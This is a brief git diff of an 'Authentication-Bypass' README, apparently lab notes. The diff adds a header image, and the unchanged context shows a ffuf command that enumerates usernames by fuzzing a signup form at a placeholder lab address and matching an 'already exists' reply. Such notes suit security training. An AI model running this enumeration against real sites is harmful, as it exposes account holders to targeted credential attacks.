@@ -1,4 +1,4 @@
-# Authentication-Bypass
+# Authentication-Bypass ![loginReq](https://user-images.githubusercontent.com/94301241/175791940-dea54eb2-cfb2-4cd5-885d-6ac5f2dc6190.png)
 
 # 🤢Username Enumeration
   ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type:       application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
